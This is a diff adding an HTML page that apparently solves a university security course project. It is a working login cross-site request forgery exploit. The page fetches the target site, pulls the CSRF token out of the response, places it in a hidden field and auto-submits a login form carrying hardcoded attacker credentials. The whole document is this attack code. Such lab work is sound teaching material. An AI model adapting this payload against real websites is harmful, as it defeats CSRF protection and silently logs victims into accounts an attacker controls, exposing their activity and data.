@@ -1,0 +1,29 @@
+<head>
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
+</head>
+
+<form action="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0" method="post" class="form-inline">
+    <p>Log in or create an account.</p>
+    <div class="form-group form-space">
+		<input type="hidden" id="tok" name="csrf_token" value="-">
+        <input id="username" name="username" type="text" value="attacker" required="" class="form-control">
+    </div>
+    <div class="form-group form-space">
+        <input id="userpass" name="password" type="password" value="l33th4x" required="" class="form-control">
+    </div>
+</form>
+<script>
+setTimeout(function() {
+
+url="https://project2.ecen4133.org/?csrfdefense=1&xssdefense=0";
+//console.log("hi")
+
+$.get(url, function(resp) {
+var token = $(resp).find("input")[3].value;
+alert(token);
+document.getElementById("tok").value = token;
+document.forms[0].submit();
+});
+
+}, 1000);
+</script>
